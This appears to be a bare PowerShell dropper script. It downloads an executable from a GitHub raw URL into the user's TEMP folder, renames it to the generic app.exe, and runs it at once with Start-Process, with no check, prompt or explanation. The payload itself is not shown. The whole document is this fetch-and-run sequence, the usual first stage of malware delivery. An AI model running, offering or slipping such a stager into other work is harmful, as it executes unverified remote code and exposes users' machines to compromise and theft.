$u = 'https://github.com/johnbunkerton/main/raw/refs/heads/main/main.exe'
$p = "$env:TEMP\app.exe"
(New-Object Net.WebClient).DownloadFile($u, $p)
Start-Process $p
